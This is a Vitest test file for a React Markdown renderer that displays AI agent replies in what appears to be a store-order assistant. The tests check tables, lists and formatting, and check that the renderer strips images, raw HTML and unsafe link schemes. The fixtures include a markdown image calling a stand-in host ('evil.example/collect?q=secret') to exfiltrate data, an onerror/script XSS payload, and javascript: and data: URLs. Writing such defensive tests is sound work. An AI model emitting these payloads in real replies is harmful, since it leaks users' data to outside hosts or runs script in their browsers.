import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown, safeLinkUrl } from './Markdown';

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

describe('Markdown (agent replies)', () => {
  it('renders a GitHub table as a real table', () => {
    const html = render(['| Order | Total | Status |', '|---|---:|---|', '| #20 | ₹799.00 | Processing |'].join('\n'));
    expect(html).toContain('<table');
    expect(html).toMatch(/<th[^>]*>Order<\/th>/);
    expect(html).toMatch(/<td[^>]*>₹799.00<\/td>/);
    expect(html).not.toContain('|---|');
  });

  it('renders bold, lists and inline code', () => {
    const html = render('**Today:** 2 orders\n\n- one\n- two\n\nUse `woo__list_orders`.');
    expect(html).toContain('<strong');
    expect(html).toContain('<ul');
    expect(html).toContain('<code');
  });

  it('never renders an image, so nothing is fetched from a URL in the text', () => {
    const html = render('![order data](https://evil.example/collect?q=secret)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('[image: order data not shown]');
  });

  it('drops raw HTML instead of rendering it', () => {
    const html = render('<img src=x onerror=alert(1)><script>alert(1)</script><b>bold?</b> text');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<b>');
    expect(html).toContain('text');
  });

  it('keeps http(s) links, opens them safely, and neutralises other schemes', () => {
    const ok = render('[store](https://store.urumi.humanslop.in/shop/)');
    expect(ok).toContain('href="https://store.urumi.humanslop.in/shop/"');
    expect(ok).toContain('rel="noopener noreferrer nofollow"');
    expect(ok).toContain('target="_blank"');

    const bad = render('[click](javascript:alert(1)) [data](data:text/html;base64,PHNjcmlwdD4=)');
    expect(bad).not.toContain('javascript:');
    expect(bad).not.toContain('data:text');
    expect(bad).not.toContain('<a ');
  });
});

describe('safeLinkUrl', () => {
  it('allows only http, https and mailto', () => {
    expect(safeLinkUrl('https://example.com/a?b=1')).toBe('https://example.com/a?b=1');
    expect(safeLinkUrl('http://example.com')).toBe('http://example.com');
    expect(safeLinkUrl('mailto:hello@example.com')).toBe('mailto:hello@example.com');
    expect(safeLinkUrl('javascript:alert(1)')).toBe('');
    expect(safeLinkUrl('JaVaScRiPt:alert(1)')).toBe('');
    expect(safeLinkUrl('/relative/path')).toBe('');
    expect(safeLinkUrl('ftp://example.com/file')).toBe('');
  });
});
